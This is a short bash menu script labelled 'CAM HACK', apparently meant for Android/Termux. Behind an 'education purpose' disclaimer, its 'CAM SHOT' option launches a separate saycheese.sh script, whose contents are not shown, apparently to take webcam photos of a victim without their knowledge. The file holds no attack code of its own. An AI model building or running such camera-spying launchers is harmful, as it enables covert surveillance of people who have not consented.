#!bin/bash
clear
figlet CAM HACK |lolcat
echo "* WARNING:THIS SCRIPT IS ONLY FOR EDUCATION PURPOSE:USE   AT YOUR OWN RISK."
echo "* ENTER CTRL+Z TO EXIT."
echo "____________________________________________________"
echo
echo
echo "     [+] CAM STREAM  (press 1)"
echo "     [+] CAM SHOT    (press 2)"
echo
read nn
if [ $nn -eq 1 ];then
echo "COMING SOON"
exit 0
elif [ $nn -eq 2 ];then
clear
echo "STARTING CAM SHOT..................."
cd
cd /sdcard/DEVIL/script/camhack
bash saycheese.sh
exit 0
fi